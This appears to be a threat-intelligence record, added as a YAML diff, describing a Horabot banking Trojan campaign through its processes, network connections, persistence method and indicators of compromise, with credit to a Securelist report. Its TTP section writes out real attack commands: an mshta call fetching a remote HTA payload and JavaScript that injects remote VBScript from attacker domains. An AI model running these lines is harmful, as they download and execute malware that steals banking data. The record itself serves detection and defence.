@@ -1,0 +1,72 @@
+description: Targeted campaign involving Horabot, a banking Trojan, email spreader,
+  and complex attack chain.
+malware_families:
+- Casbaneiro
+- Ponteiro
+- Metamorfo
+- Zusy
+TTPs:
+  processes:
+  - mshta.exe
+  - AutoIt3.exe
+  commandline:
+  - mshta https://evs.grupotuis[.]buzz/0capcha17/DMEENLIGGB.hta
+  powershell:
+  - null
+  scripting_engine:
+  - var scriptEle = document.createElement("script"); scriptEle.setAttribute("src","https://pdj.gruposhac[.]lat/g1/ld1/"); scriptEle.setAttribute("type", "text/vbscript");document.getElementsByTagName('head')[0].appendChild(scriptEle);
+  - var scriptEle = document.createElement("script"); scriptEle.setAttribute("src","https://pdj.gruposhac[.]lat/g1/"); scriptEle.setAttribute("type", "text/vbscript");document.getElementsByTagName('head')[0].appendChild(scriptEle);
+  registry_keys:
+  - null
+  image_load:
+  - libeay32.dll
+  - ssleay32.dll
+  network_connections:
+  - mshta.exe->https://evs.grupotuis[.]buzz/0capcha17/DMEENLIGGB.hta
+  - AutoIt3.exe->https://cgf.facturastbs[.]shop/0725/a/home (GET)
+  - AutoIt3.exe->https://cfg.brasilinst[.]site/a/br/logs/index.php?CHLG (POST)
+  - AutoIt3.exe->https://aufal.filevexcasv[.]buzz/on7/index15.php (POST)
+  - AutoIt3.exe->https://aufal.filevexcasv[.]buzz/on7all/index15.php (POST)
+  - AutoIt3.exe->https://cgf.facturastbs[.]shop/a/08/150822/au/at.html (GET)
+  - AutoIt3.exe->https://upstar.pics/a/08/150822/up/up (GET)
+  - AutoIt3.exe->https://cgf.midasx.site/a/08/150822/au/au (GET)
+  file_activity:
+  - C:\Users\Public\LAPTOP-0QF0NEUP4
+  - C:\Users\Public\LAPTOP-0QF0NEUP499521487B080723_N
+  - libeay32.dll
+  - ssleay32.dll
+  persistence:
+  - Creates a LNK file and drops it into the Startup folder to maintain persistence.
+  process_relations:
+  - mshta.exe->AutoIt3.exe
+CVEs:
+- null
+IOCs:
+  hashes:
+  - 6272ef6ac1de8fb4bdd4a760be7ba5ed
+  ip_addresses:
+  - null
+  domains:
+  - evs.grupotuis[.]buzz
+  - pdj.gruposhac[.]lat
+  - cgf.facturastbs[.]shop
+  - cfg.brasilinst[.]site
+  - aufal.filevexcasv[.]buzz
+  - upstar.pics
+  - cgf.midasx.site
+  urls:
+  - https://evs.grupotuis[.]buzz/0capcha17/DMEENLIGGB.hta
+  - https://pdj.gruposhac[.]lat/g1/ld1/
+  - https://cgf.facturastbs[.]shop/0725/a/home
+  - https://cfg.brasilinst[.]site/a/br/logs/index.php?CHLG
+  - https://aufal.filevexcasv[.]buzz/on7/index15.php
+  - https://aufal.filevexcasv[.]buzz/on7all/index15.php
+  - https://cgf.facturastbs[.]shop/a/08/150822/au/at.html
+  - https://upstar.pics/a/08/150822/up/up
+  - https://cgf.midasx.site/a/08/150822/au/au
+authors:
+- Domenico Caldarella
+- Mateus Salgado
+reference: https://securelist.com/horabot-campaign/119033
+date_of_publication: March 18, 2026
+file_creation_date: March 19, 2026
